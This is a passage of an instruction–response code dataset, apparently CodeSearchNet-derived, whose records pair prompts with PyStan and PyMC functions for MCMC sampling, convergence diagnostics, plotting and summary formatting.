`chain_id`.\n\n    seed : int or np.random.RandomState, optional\n        The seed, a positive integer for random number generation. Only\n        one seed is needed when multiple chains are used, as the other\n        chain's seeds are generated from the first chain's to prevent\n        dependency among random number streams. By default, seed is\n        ``random.randint(0, MAX_UINT)``.\n\n    algorithm : {\"NUTS\", \"HMC\", \"Fixed_param\"}, optional\n        One of the algorithms that are implemented in Stan such as the No-U-Turn\n        sampler (NUTS, Hoffman and Gelman 2011) and static HMC.\n\n    sample_file : string, optional\n        File name specifying where samples for *all* parameters and other\n        saved quantities will be written. If not provided, no samples\n        will be written. If the folder given is not writable, a temporary\n        directory will be used. When there are multiple chains, an underscore\n        and chain number are appended to the file name. By default do not\n        write samples to file.\n\n    diagnostic_file : string, optional\n        File name specifying where diagnostic information should be written.\n        By default no diagnostic information is recorded.\n\n    boost_lib : string, optional\n        The path to a version of the Boost C++ library to use instead of\n        the one supplied with PyStan.\n\n    eigen_lib : string, optional\n        The path to a version of the Eigen C++ library to use instead of\n        the one in the supplied with PyStan.\n\n    include_paths : list of strings, optional\n        Paths for #include files defined in Stan code.\n\n    verbose : boolean, optional\n        Indicates whether intermediate output should be piped to the console.\n        This output may be useful for debugging. False by default.\n\n    control : dict, optional\n        A dictionary of parameters to control the sampler's behavior. Default\n        values are used if control is not specified.  The following are\n        adaptation parameters for sampling algorithms.\n\n        These are parameters used in Stan with similar names:\n\n        - `adapt_engaged` : bool\n        - `adapt_gamma` : float, positive, default 0.05\n        - `adapt_delta` : float, between 0 and 1, default 0.8\n        - `adapt_kappa` : float, between default 0.75\n        - `adapt_t0`    : float, positive, default 10\n        - `adapt_init_buffer` : int, positive, defaults to 75\n        - `adapt_term_buffer` : int, positive, defaults to 50\n        - `adapt_window` : int, positive, defaults to 25\n\n        In addition, the algorithm HMC (called 'static HMC' in Stan) and NUTS\n        share the following parameters:\n\n        - `stepsize`: float, positive\n        - `stepsize_jitter`: float, between 0 and 1\n        - `metric` : str, {\"unit_e\", \"diag_e\", \"dense_e\"}\n\n        In addition, depending on which algorithm is used, different parameters\n        can be set as in Stan for sampling. For the algorithm HMC we can set\n\n        - `int_time`: float, positive\n\n        For algorithm NUTS, we can set\n\n        - `max_treedepth` : int, positive\n\n    n_jobs : int, optional\n        Sample in parallel. If -1 all CPUs are used. If 1, no parallel\n        computing code is used at all, which is useful for debugging.\n\n    Returns\n    -------\n\n    fit : StanFit instance\n\n    Other parameters\n    ----------------\n\n    chain_id : int, optional\n        `chain_id` can be a vector to specify the chain_id for all chains or\n        an integer. For the former case, they should be unique. For the latter,\n        the sequence of integers starting from the given `chain_id` are used\n        for all chains.\n\n    init_r : float, optional\n        `init_r` is only valid if `init` == \"random\". In this case, the intial\n        values are simulated from [-`init_r`, `init_r`] rather than using the\n        default interval (see the manual of (Cmd)Stan).\n\n    test_grad: bool, optional\n        If `test_grad` is ``True``, Stan will not do any sampling. Instead,\n        the gradient calculation is tested and printed out and the fitted\n        StanFit4Model object is in test gradient mode.  By default, it is\n        ``False``.\n\n    append_samples`: bool, optional\n\n    refresh`: int, optional\n        Argument `refresh` can be used to control how to indicate the progress\n        during sampling (i.e. show the progress every \\code{refresh} iterations).\n        By default, `refresh` is `max(iter/10, 1)`.\n\n    obfuscate_model_name : boolean, optional\n        `obfuscate_model_name` is only valid if `fit` is None. True by default.\n        If False the model name in the generated C++ code will not be made\n        unique by the insertion of randomly generated characters.\n        Generally it is recommended that this parameter be left as True.\n\n    Examples\n    --------\n    >>> from pystan import stan\n    >>> import numpy as np\n    >>> model_code = '''\n    ... parameters {\n    ...   real y[2];\n    ... }\n    ... model {\n    ...   y[1] ~ normal(0, 1);\n    ...   y[2] ~ double_exponential(0, 2);\n    ... }'''\n    >>> fit1 = stan(model_code=model_code, iter=10)\n    >>> print(fit1)\n    >>> excode = '''\n    ... transformed data {\n    ...     real y[20];\n    ...     y[1] = 0.5796;  y[2]  = 0.2276;   y[3] = -0.2959;\n    ...     y[4] = -0.3742; y[5]  = 0.3885;   y[6] = -2.1585;\n    ...     y[7] = 0.7111;  y[8]  = 1.4424;   y[9] = 2.5430;\n    ...     y[10] = 0.3746; y[11] = 0.4773;   y[12] = 0.1803;\n    ...     y[13] = 0.5215; y[14] = -1.6044;  y[15] = -0.6703;\n    ...     y[16] = 0.9459; y[17] = -0.382;   y[18] = 0.7619;\n    ...     y[19] = 0.1006; y[20] = -1.7461;\n    ... }\n    ... parameters {\n    ...     real mu;\n    ...     real<lower=0, upper=10> sigma;\n    ...     vector[2] z[3];\n    ...     real<lower=0> alpha;\n    ... }\n    ... model {\n    ...     y ~ normal(mu, sigma);\n    ...     for (i in 1:3)\n    ...     z[i] ~ normal(0, 1);\n    ...     alpha ~ exponential(2);\n    ... }'''\n    >>>\n    >>> def initfun1():\n    ...     return dict(mu=1, sigma=4, z=np.random.normal(size=(3, 2)), alpha=1)\n    >>> exfit0 = stan(model_code=excode, init=initfun1)\n    >>> def initfun2(chain_id=1):\n    ...     return dict(mu=1, sigma=4, z=np.random.normal(size=(3, 2)), alpha=1 + chain_id)\n    >>> exfit1 = stan(model_code=excode, init=initfun2)\n    \"\"\"\n    logger.warning('DeprecationWarning: pystan.stan was deprecated in version 2.17 and will be removed in version 3.0. '\n                  'Compile and use a Stan program in separate steps.')\n    # NOTE: this is a thin wrapper for other functions. Error handling occurs\n    # elsewhere.\n    if data is None:\n        data = {}\n    if warmup is None:\n        warmup = int(iter // 2)\n    obfuscate_model_name = kwargs.pop(\"obfuscate_model_name\", True)\n    if fit is not None:\n        m = fit.stanmodel\n    else:\n        m = StanModel(file=file, model_name=model_name, model_code=model_code,\n                      boost_lib=boost_lib, eigen_lib=eigen_lib,\n                      include_paths=include_paths,\n                      obfuscate_model_name=obfuscate_model_name, verbose=verbose)\n    # check that arguments in kwargs are valid\n    valid_args = {\"chain_id\", \"init_r\", \"test_grad\", \"append_samples\", \"enable_random_init\",\n                  \"refresh\", \"control\"}\n    for arg in kwargs:\n        if arg not in valid_args:\n            raise ValueError(\"Parameter `{}` is not recognized.\".format(arg))\n\n    fit = m.sampling(data, pars=pars, chains=chains, iter=iter,\n                     warmup=warmup, thin=thin, seed=seed, init=init,\n                     sample_file=sample_file, diagnostic_file=diagnostic_file,\n                     verbose=verbose, algorithm=algorithm, control=control,\n                     n_jobs=n_jobs, **kwargs)\n    return fit", "response": "Fit a model using Stan."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncalculate effective sample size of a single node", "response": "def ess(sim, n):\n    \"\"\"Calculate effective sample size\n\n    Parameters\n    ----------\n    sim : chains\n    n : int\n        Parameter index starting from 0\n    \"\"\"\n    try:\n        ess = _chains.effective_sample_size(sim, n)\n    except (ValueError, ZeroDivisionError):\n        ess = nan\n    return ess"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef splitrhat(sim, n):\n    try:\n        rhat = _chains.split_potential_scale_reduction(sim, n)\n    except (ValueError, ZeroDivisionError):\n        rhat = nan\n    return rhat", "response": "Calculate the rhat of a single n - element potential scale reduction."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreformat the model_code to remove whitespace around the include statements.", "response": "def fix_include(model_code):\n    \"\"\"Reformat `model_code` (remove whitespace) around the #include statements.\n    \n    Note\n    ----\n        A modified `model_code` is returned.\n\n    Parameters\n    ----------\n    model_code : str\n        Model code\n\n    Returns\n    -------\n    str\n        Reformatted model code\n    \n    Example\n    -------\n        \n    >>> from pystan.experimental import fix_include\n    >>> model_code = \"parameters { #include myfile.stan \\n...\"\n    >>> model_code_reformatted = fix_include(model_code)\n    # \"parameters {#include myfile.stan\\n...\"\n\n    \"\"\"\n    pattern = r\"(?<=\\n)\\s*(#include)\\s*(\\S+)\\s*(?=\\n)\"\n    model_code, n = re.subn(pattern, r\"\\1 \\2\", model_code)\n    if n == 1:\n        msg = \"Made {} substitution for the model_code\"\n    else:\n        msg = \"Made {} substitutions for the model_code\"\n    logger.info(msg.format(n))\n    return model_code"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nusing pymc s traceplot to display parameters.", "response": "def traceplot(fit, pars, dtypes, **kwargs):\n    \"\"\"\n    Use pymc's traceplot to display parameters.\n\n    Additional arguments are passed to pymc.plots.traceplot.\n    \"\"\"\n    # FIXME: eventually put this in the StanFit object\n    # FIXME: write a to_pymc(_trace) function\n    # Deprecation warning added in PyStan 2.18\n    logger.warning(\"Deprecation warning.\"\\\n                   \" In future, use ArviZ library (`pip install arviz`)\")\n    try:\n        from pystan.external.pymc import plots\n    except ImportError:\n        logger.critical(\"matplotlib required for plotting.\")\n        raise\n    if pars is None:\n        pars = list(fit.model_pars) + [\"lp__\"]\n    values = fit.extract(dtypes=dtypes, pars=pars, permuted=False)\n    values = {key : arr.reshape(-1, int(np.multiply.reduce(arr.shape[2:])), order=\"F\") for key, arr in values.items()}\n    return plots.traceplot(values, pars, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _make_class_unpicklable(cls):\n    def _break_on_call_reduce(self):\n        raise TypeError('%r cannot be pickled' % self)\n    cls.__reduce__ = _break_on_call_reduce\n    cls.__module__ = '<unknown>'", "response": "Make the given class un - picklable."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbarring plot of the autocorrelation function for a trace", "response": "def autocorrplot(trace, vars=None, fontmap = None, max_lag=100):\n    \"\"\"Bar plot of the autocorrelation function for a trace\"\"\"\n\n    try:\n        # MultiTrace\n        traces = trace.traces\n\n    except AttributeError:\n\n        # NpTrace\n        traces = [trace]\n\n    if fontmap is None: fontmap = {1:10, 2:8, 3:6, 4:5, 5:4}\n\n    if vars is None:\n        vars = traces[0].varnames\n\n    # Extract sample data\n    samples = [{v:trace[v] for v in vars} for trace in traces]\n\n    chains = len(traces)\n\n    n = len(samples[0])\n    f, ax = subplots(n, chains, squeeze=False)\n\n    max_lag = min(len(samples[0][vars[0]])-1, max_lag)\n\n    for i, v in enumerate(vars):\n\n        for j in xrange(chains):\n\n            d = np.squeeze(samples[j][v])\n\n            ax[i,j].acorr(d, detrend=mlab.detrend_mean, maxlags=max_lag)\n\n            if not j:\n                ax[i, j].set_ylabel(\"correlation\")\n            ax[i, j].set_xlabel(\"lag\")\n\n            if chains > 1:\n                ax[i, j].set_title(\"chain {0}\".format(j+1))\n\n    # Smaller tick labels\n    tlabels = gca().get_xticklabels()\n    setp(tlabels, 'fontsize', fontmap[1])\n\n    tlabels = gca().get_yticklabels()\n    setp(tlabels, 'fontsize', fontmap[1])"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a tree of nodes that are plotted by the given trace object.", "response": "def forestplot(trace_obj, vars=None, alpha=0.05, quartiles=True, rhat=True,\n               main=None, xtitle=None, xrange=None, ylabels=None, chain_spacing=0.05, vline=0):\n    \"\"\" Forest plot (model summary plot)\n\n    Generates a \"forest plot\" of 100*(1-alpha)% credible intervals for either the\n    set of variables in a given model, or a specified set of nodes.\n\n    :Arguments:\n        trace_obj: NpTrace or MultiTrace object\n            Trace(s) from an MCMC sample.\n\n        vars: list\n            List of variables to plot (defaults to None, which results in all\n            variables plotted).\n\n        alpha (optional): float\n            Alpha value for (1-alpha)*100% credible intervals (defaults to 0.05).\n\n        quartiles (optional): bool\n            Flag for plotting the interquartile range, in addition to the\n            (1-alpha)*100% intervals (defaults to True).\n\n        rhat (optional): bool\n            Flag for plotting Gelman-Rubin statistics. Requires 2 or more\n            chains (defaults to True).\n\n        main (optional): string\n            Title for main plot. Passing False results in titles being\n            suppressed; passing None (default) results in default titles.\n\n        xtitle (optional): string\n            Label for x-axis. Defaults to no label\n\n        xrange (optional): list or tuple\n            Range for x-axis. Defaults to matplotlib's best guess.\n\n        ylabels (optional): list\n            User-defined labels for each variable. If not provided, the node\n            __name__ attributes are used.\n\n        chain_spacing (optional): float\n            Plot spacing between chains (defaults to 0.05).\n\n        vline (optional): numeric\n            Location of vertical reference line (defaults to 0).\n\n    \"\"\"\n\n    if not gridspec:\n        print_(\n            '\\nYour installation of matplotlib is not recent enough to support summary_plot; this function is disabled until matplotlib is updated.')\n        return\n\n    # Quantiles to be calculated\n    qlist = [100 * alpha / 2, 50, 100 * (1 - alpha / 2)]\n    if quartiles:\n        qlist = [100 * alpha / 2, 25, 50, 75, 100 * (1 - alpha / 2)]\n\n    # Range for x-axis\n    plotrange = None\n\n    # Number of chains\n    chains = None\n\n    # Gridspec\n    gs = None\n\n    # Subplots\n    interval_plot = None\n    rhat_plot = None\n\n    try:\n        # First try MultiTrace type\n        traces = trace_obj.traces\n\n        if rhat and len(traces) > 1:\n\n            from .diagnostics import gelman_rubin\n\n            R = gelman_rubin(trace_obj)\n            if vars is not None:\n                R = {v: R[v] for v in vars}\n\n        else:\n\n            rhat = False\n\n    except AttributeError:\n\n        # Single NpTrace\n        traces = [trace_obj]\n\n        # Can't calculate Gelman-Rubin with a single trace\n        rhat = False\n\n    if vars is None:\n        vars = traces[0].varnames\n\n    # Empty list for y-axis labels\n    labels = []\n\n    chains = len(traces)\n\n    if gs is None:\n        # Initialize plot\n        if rhat and chains > 1:\n            gs = gridspec.GridSpec(1, 2, width_ratios=[3, 1])\n\n        else:\n\n            gs = gridspec.GridSpec(1, 1)\n\n        # Subplot for confidence intervals\n        interval_plot = subplot(gs[0])\n\n    for j, tr in enumerate(traces):\n\n        # Get quantiles\n        trace_quantiles = quantiles(tr, qlist)\n        hpd_intervals = hpd(tr, alpha)\n\n        # Counter for current variable\n        var = 1\n\n        for varname in vars:\n\n            var_quantiles = trace_quantiles[varname]\n\n            quants = var_quantiles.values()\n            var_hpd = hpd_intervals[varname].T\n\n            # Substitute HPD interval for quantile\n            quants[0] = var_hpd[0].T\n            quants[-1] = var_hpd[1].T\n\n            # Ensure x-axis contains range of current interval\n            if plotrange:\n                plotrange = [min(\n                             plotrange[0],\n                             np.min(quants)),\n                             max(plotrange[1],\n                                 np.max(quants))]\n            else:\n                plotrange = [np.min(quants), np.max(quants)]\n\n            # Number of elements in current variable\n            value = tr[varname][0]\n            k = np.size(value)\n\n            # Append variable name(s) to list\n            if not j:\n                if k > 1:\n                    names = var_str(varname, shape(value))\n                    labels += names\n                else:\n                    labels.append(varname)\n                    # labels.append('\\n'.join(varname.split('_')))\n\n            # Add spacing for each chain, if more than one\n            e = [0] + [(chain_spacing * ((i + 2) / 2)) *\n                (-1) ** i for i in range(chains - 1)]\n\n            # Deal with multivariate nodes\n            if k > 1:\n\n                for i, q in enumerate(np.transpose(quants).squeeze()):\n\n                    # Y coordinate with jitter\n                    y = -(var + i) + e[j]\n\n                    if quartiles:\n                        # Plot median\n                        plot(q[2], y, 'bo', markersize=4)\n                        # Plot quartile interval\n                        errorbar(\n                            x=(q[1],\n                                q[3]),\n                            y=(y,\n                                y),\n                            linewidth=2,\n                            color=\"blue\")\n\n                    else:\n                        # Plot median\n                        plot(q[1], y, 'bo', markersize=4)\n\n                    # Plot outer interval\n                    errorbar(\n                        x=(q[0],\n                            q[-1]),\n                        y=(y,\n                            y),\n                        linewidth=1,\n                        color=\"blue\")\n\n            else:\n\n                # Y coordinate with jitter\n                y = -var + e[j]\n\n                if quartiles:\n                    # Plot median\n                    plot(quants[2], y, 'bo', markersize=4)\n                    # Plot quartile interval\n                    errorbar(\n                        x=(quants[1],\n                            quants[3]),\n                        y=(y,\n                            y),\n                        linewidth=2,\n                        color=\"blue\")\n                else:\n                    # Plot median\n                    plot(quants[1], y, 'bo', markersize=4)\n\n                # Plot outer interval\n                errorbar(\n                    x=(quants[0],\n                        quants[-1]),\n                    y=(y,\n                        y),\n                    linewidth=1,\n                    color=\"blue\")\n\n            # Increment index\n            var += k\n\n    labels = ylabels or labels\n\n    # Update margins\n    left_margin = np.max([len(x) for x in labels]) * 0.015\n    gs.update(left=left_margin, right=0.95, top=0.9, bottom=0.05)\n\n    # Define range of y-axis\n    ylim(-var + 0.5, -0.5)\n\n    datarange = plotrange[1] - plotrange[0]\n    xlim(plotrange[0] - 0.05 * datarange, plotrange[1] + 0.05 * datarange)\n\n    # Add variable labels\n    yticks([-(l + 1) for l in range(len(labels))], labels)\n\n    # Add title\n    if main is not False:\n        plot_title = main or str(int((\n            1 - alpha) * 100)) + \"% Credible Intervals\"\n        title(plot_title)\n\n    # Add x-axis label\n    if xtitle is not None:\n        xlabel(xtitle)\n\n    # Constrain to specified range\n    if xrange is not None:\n        xlim(*xrange)\n\n    # Remove ticklines on y-axes\n    for ticks in interval_plot.yaxis.get_major_ticks():\n        ticks.tick1On = False\n        ticks.tick2On = False\n\n    for loc, spine in interval_plot.spines.iteritems():\n        if loc in ['bottom', 'top']:\n            pass\n            # spine.set_position(('outward',10)) # outward by 10 points\n        elif loc in ['left', 'right']:\n            spine.set_color('none')  # don't draw spine\n\n    # Reference line\n    axvline(vline, color='k', linestyle='--')\n\n    # Genenerate Gelman-Rubin plot\n    if rhat and chains > 1:\n\n        # If there are multiple chains, calculate R-hat\n        rhat_plot = subplot(gs[1])\n\n        if main is not False:\n            title(\"R-hat\")\n\n        # Set x range\n        xlim(0.9, 2.1)\n\n        # X axis labels\n        xticks((1.0, 1.5, 2.0), (\"1\", \"1.5\", \"2+\"))\n        yticks([-(l + 1) for l in range(len(labels))], \"\")\n\n        i = 1\n        for varname in vars:\n\n            value = traces[0][varname][0]\n            k = np.size(value)\n\n            if k > 1:\n                plot([min(r, 2) for r in R[varname]], [-(j + i)\n                     for j in range(k)], 'bo', markersize=4)\n            else:\n                plot(min(R[varname], 2), -i, 'bo', markersize=4)\n\n            i += k\n\n        # Define range of y-axis\n        ylim(-i + 0.5, -0.5)\n\n        # Remove ticklines on y-axes\n        for ticks in rhat_plot.yaxis.get_major_ticks():\n            ticks.tick1On = False\n            ticks.tick2On = False\n\n        for loc, spine in rhat_plot.spines.iteritems():\n            if loc in ['bottom', 'top']:\n                pass\n                # spine.set_position(('outward',10)) # outward by 10 points\n            elif loc in ['left', 'right']:\n                spine.set_color('none')  # don't draw spine\n\n    return gs"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef check_treedepth(fit, verbose=True, per_chain=False):\n\n    verbosity = int(verbose)\n\n    sampler_params = fit.get_sampler_params(inc_warmup=False)\n\n    try:\n        depths = np.column_stack([y['treedepth__'].astype(int) for y in sampler_params])\n    except:\n        raise ValueError('Cannot access tree depth information from fit object')\n\n    try:\n        max_treedepth = int(fit.stan_args[0]['ctrl']['sampling']['max_treedepth'])\n    except:\n        raise ValueError('Cannot obtain value of max_treedepth from fit object')\n\n    n_for_chains =  (depths >= max_treedepth).sum(axis=0)\n\n    n = n_for_chains.sum()\n\n    if n > 0:\n        if verbosity > 0:\n            N = depths.size\n            logger.warning(('{} of {} iterations saturated the maximum tree depth of {}'\n                                + ' ({:.3g} %)').format(n, N, max_treedepth, 100 * n / N))\n\n            if per_chain:\n                chain_len, num_chains = depths.shape\n\n                for chain_num in range(num_chains):\n                    if n_for_chains[chain_num] > 0:\n                        logger.warning('Chain {}: {} of {} saturated '.format(chain_num + 1,\n                                                                              n_for_chains[chain_num],\n                                                                              chain_len) +\n                                       'the maximum tree depth of {} ({:.3g} %).'.format(max_treedepth,\n                                                                                    100 * n_for_chains[chain_num] /\n                                                                                    chain_len))\n\n            logger.warning('Run again with max_treedepth larger than {}'.format(max_treedepth) +\n                           ' to avoid saturation')\n\n        return False\n    else:\n        if verbosity > 2:\n            logger.info('No transitions that ended prematurely due to maximum tree depth limit')\n\n        return True", "response": "Checks if the tree depth of a given fit object is less than or equal to the maximum tree depth limit."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncheck the energy of missing information from a given fit object.", "response": "def check_energy(fit, verbose=True):\n    \"\"\"Checks the energy Bayesian fraction of missing information (E-BFMI)\n\n    Parameters\n    ----------\n    fit : StanFit4Model object\n    verbose : bool or int, optional\n        If ``verbose`` is ``False`` or a nonpositive integer, no\n        diagnostic messages are printed, and only the return value of\n        the function conveys diagnostic information. If it is ``True``\n        (the default) or an integer greater than zero, then a\n        diagnostic message is printed only if there is low E-BFMI in\n        one or more chains. If it is an integer greater than 2, then\n        extra diagnostic messages are printed.\n\n\n    Returns\n    -------\n    bool\n        ``True`` if there are no problems with E-BFMI and ``False``\n        otherwise.\n\n    Raises\n    ------\n    ValueError\n        If ``fit`` has no information about E-BFMI.\n\n    \"\"\"\n\n    verbosity = int(verbose)\n\n    sampler_params = fit.get_sampler_params(inc_warmup=False)\n\n    try:\n        energies = np.column_stack([y['energy__'] for y in sampler_params])\n    except:\n        raise ValueError('Cannot access energy information from fit object')\n\n    chain_len, num_chains = energies.shape\n\n    numer = ((np.diff(energies, axis=0)**2).sum(axis=0)) / chain_len\n\n    denom = np.var(energies, axis=0)\n\n    e_bfmi = numer / denom\n\n    no_warning = True\n    for chain_num in range(num_chains):\n\n        if e_bfmi[chain_num] < 0.2:\n            if verbosity > 0:\n                logger.warning('Chain {}: E-BFMI = {:.3g}'.format(chain_num + 1,\n                                                              e_bfmi[chain_num]))\n\n            no_warning = False\n        else:\n            if verbosity > 2:\n                logger.info('Chain {}: E-BFMI (= {:.3g}) '.format(chain_num + 1,\n                                                              e_bfmi[chain_num]) +\n                            'equals or exceeds threshold of 0.2.')\n\n    if no_warning:\n        if verbosity > 2:\n            logger.info('E-BFMI indicated no pathological behavior')\n\n        return True\n    else:\n        if verbosity > 0:\n            logger.warning('E-BFMI below 0.2 indicates you may need to reparameterize your model')\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef check_n_eff(fit, pars=None, verbose=True):\n\n    verbosity = int(verbose)\n\n    n_iter = sum(fit.sim['n_save'])-sum(fit.sim['warmup2'])\n\n    if pars is None:\n        pars = fit.sim['fnames_oi']\n    else:\n        if isinstance(pars, string_types):\n            pars = [pars]\n        pars = _remove_empty_pars(pars, fit.sim['pars_oi'], fit.sim['dims_oi'])\n        allpars = fit.sim['pars_oi'] + fit.sim['fnames_oi']\n        _check_pars(allpars, pars)\n        packed_pars = set(pars) - set(fit.sim['fnames_oi'])\n        if packed_pars:\n            unpack_dict = {}\n            for par_unpacked in fit.sim['fnames_oi']:\n                par_packed = par_unpacked.split(\"[\")[0]\n                if par_packed not in unpack_dict:\n                    unpack_dict[par_packed] = []\n                unpack_dict[par_packed].append(par_unpacked)\n            pars_unpacked = []\n            for par in pars:\n                if par in packed_pars:\n                    pars_unpacked.extend(unpack_dict[par])\n                else:\n                    pars_unpacked.append(par)\n            pars = pars_unpacked\n\n    par_n_dict = {}\n    for n, par in enumerate(fit.sim['fnames_oi']):\n        par_n_dict[par] = n\n\n    no_warning = True\n    for name in pars:\n        n = par_n_dict[name]\n        n_eff = pystan.chains.ess(fit.sim, n)\n        ratio = n_eff / n_iter\n        if ((ratio < 0.001) or np.isnan(ratio) or np.isinf(ratio)):\n            if verbosity > 1:\n                logger.warning('n_eff / iter for parameter {} is {:.3g}!'.format(name, ratio))\n\n            no_warning = False\n            if verbosity <= 1:\n                break\n\n    if no_warning:\n        if verbosity > 2:\n            logger.info('n_eff / iter looks reasonable for all parameters')\n\n        return True\n    else:\n        if verbosity > 0:\n            logger.warning('n_eff / iter below 0.001 indicates that the effective sample size has likely been overestimated')\n\n        return False", "response": "Checks the effective sample size per iteration."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_hmc_diagnostics(fit, pars=None, verbose=True, per_chain=False, checks=None):\n\n    # For consistency with the individual diagnostic functions\n    verbosity = int(verbose)\n\n    all_checks = {\"n_eff\", \"Rhat\", \"divergence\", \"treedepth\", \"energy\"}\n    if checks is None:\n        checks = all_checks\n    else:\n        undefined_checks = []\n        for c in checks:\n            # accept lowercase Rhat\n            if c == \"rhat\":\n                continue\n            if c not in all_checks:\n                undefined_checks.append(c)\n        if undefined_checks:\n            ucstr = \"[\" + \", \".join(undefined_checks) + \"]\"\n            msg = \"checks: {} are not legal checks: {}\".format(ucstr, all_checks)\n            raise TypeError(msg)\n\n    out_dict = {}\n\n    if \"n_eff\" in checks:\n        try:\n            out_dict['n_eff'] = check_n_eff(fit, pars, verbose)\n        except ValueError:\n            if verbosity > 0:\n                logger.warning('Skipping check of effective sample size (n_eff)')\n\n    if (\"Rhat\" in checks) or (\"rhat\" in checks):\n        try:\n            out_dict['Rhat'] = check_rhat(fit, pars, verbose)\n        except ValueError:\n            if verbosity > 0:\n                logger.warning('Skipping check of potential scale reduction factors (Rhat)')\n\n    if \"divergence\" in checks:\n        try:\n            out_dict['divergence'] = check_div(fit, verbose, per_chain)\n        except ValueError:\n            if verbosity > 0:\n                logger.warning('Skipping check of divergent transitions (divergence)')\n\n    if \"treedepth\" in checks:\n        try:\n            out_dict['treedepth'] = check_treedepth(fit, verbose, per_chain)\n        except ValueError:\n            if verbosity > 0:\n                logger.warning('Skipping check of transitions ending prematurely due to maximum tree depth limit (treedepth)')\n\n    if \"energy\" in checks:\n        try:\n            out_dict['energy'] = check_energy(fit, verbose)\n        except ValueError:\n            if verbosity > 0:\n                logger.warning('Skipping check of E-BFMI (energy)')\n\n    return out_dict", "response": "Checks all hmc diagnostics for a given object."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef stansummary(fit, pars=None, probs=(0.025, 0.25, 0.5, 0.75, 0.975), digits_summary=2):\n    if fit.mode == 1:\n        return \"Stan model '{}' is of mode 'test_grad';\\n\"\\\n               \"sampling is not conducted.\".format(fit.model_name)\n    elif fit.mode == 2:\n        return \"Stan model '{}' does not contain samples.\".format(fit.model_name)\n\n    n_kept = [s - w for s, w in zip(fit.sim['n_save'], fit.sim['warmup2'])]\n    header = \"Inference for Stan model: {}.\\n\".format(fit.model_name)\n    header += \"{} chains, each with iter={}; warmup={}; thin={}; \\n\"\n    header = header.format(fit.sim['chains'], fit.sim['iter'], fit.sim['warmup'],\n                           fit.sim['thin'], sum(n_kept))\n    header += \"post-warmup draws per chain={}, total post-warmup draws={}.\\n\\n\"\n    header = header.format(n_kept[0], sum(n_kept))\n    footer = \"\\n\\nSamples were drawn using {} at {}.\\n\"\\\n        \"For each parameter, n_eff is a crude measure of effective sample size,\\n\"\\\n        \"and Rhat is the potential scale reduction factor on split chains (at \\n\"\\\n        \"convergence, Rhat=1).\"\n    sampler = fit.sim['samples'][0]['args']['sampler_t']\n    date = fit.date.strftime('%c')  # %c is locale's representation\n    footer = footer.format(sampler, date)\n    s = _summary(fit, pars, probs)\n    body = _array_to_table(s['summary'], s['summary_rownames'],\n                           s['summary_colnames'], digits_summary)\n    return header + body + footer", "response": "Returns a string that represents the summary of the parameters of a single object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nprinting an array with row and column names and a table of digits.", "response": "def _array_to_table(arr, rownames, colnames, n_digits):\n    \"\"\"Print an array with row and column names\n\n    Example:\n                  mean se_mean  sd 2.5%  25%  50%  75% 97.5% n_eff Rhat\n        beta[1,1]  0.0     0.0 1.0 -2.0 -0.7  0.0  0.7   2.0  4000    1\n        beta[1,2]  0.0     0.0 1.0 -2.1 -0.7  0.0  0.7   2.0  4000    1\n        beta[2,1]  0.0     0.0 1.0 -2.0 -0.7  0.0  0.7   2.0  4000    1\n        beta[2,2]  0.0     0.0 1.0 -1.9 -0.6  0.0  0.7   2.0  4000    1\n        lp__      -4.2     0.1 2.1 -9.4 -5.4 -3.8 -2.7  -1.2   317    1\n    \"\"\"\n    assert arr.shape == (len(rownames), len(colnames))\n    rownames_maxwidth = max(len(n) for n in rownames)\n    max_col_width = 7\n    min_col_width = 5\n    widths = [rownames_maxwidth] + [max(max_col_width, max(len(n) + 1, min_col_width)) for n in colnames]\n    header = '{:>{width}}'.format('', width=widths[0])\n    for name, width in zip(colnames, widths[1:]):\n        header += '{name:>{width}}'.format(name=name, width=width)\n    lines = [header]\n    for rowname, row in zip(rownames, arr):\n        line = '{name:{width}}'.format(name=rowname, width=widths[0])\n        for j, (num, width) in enumerate(zip(row, widths[1:])):\n            if colnames[j] == 'n_eff':\n                num = int(round(num, 0)) if not np.isnan(num) else num\n            line += '{num:>{width}}'.format(num=_format_number(num, n_digits, max_col_width - 1), width=width)\n        lines.append(line)\n    return '\\n'.join(lines)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nformatting a number using scientific notation to given significant figures", "response": "def _format_number_si(num, n_signif_figures):\n    \"\"\"Format a number using scientific notation to given significant figures\"\"\"\n    if math.isnan(num) or math.isinf(num):\n        return str(num)\n    leading, exp = '{:E}'.format(num).split('E')\n    leading = round(float(leading), n_signif_figures - 1)\n    exp = exp[:1] + exp[2:] if exp[1] == '0' else exp\n    formatted = '{}e{}'.format(leading, exp.lstrip('+'))\n    return formatted"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nformatting a number as a string while obeying space constraints.", "response": "def _format_number(num, n_signif_figures, max_width):\n    \"\"\"Format a number as a string while obeying space constraints.\n\n    `n_signif_figures` is the minimum number of significant figures expressed\n    `max_width` is the maximum width in characters allowed\n    \"\"\"\n    if max_width < 6:\n        raise NotImplementedError(\"Guaranteed formatting in fewer than 6 characters not supported.\")\n    if math.isnan(num) or math.isinf(num):\n        return str(num)\n    # add 0.5 to prevent log(0) errors; only affects n_digits calculation for num > 0\n    n_digits = lambda num: math.floor(math.log10(abs(num) + 0.5)) + 1\n    if abs(num) > 10**-n_signif_figures and n_digits(num) <= max_width - n_signif_figures:\n        return str(round(num, n_signif_figures))[:max_width].rstrip('.')\n    elif _number_width(num) <= max_width:\n        if n_digits(num) >= n_signif_figures:\n            # the int() is necessary for consistency between Python 2 and 3\n            return str(int(round(num)))\n        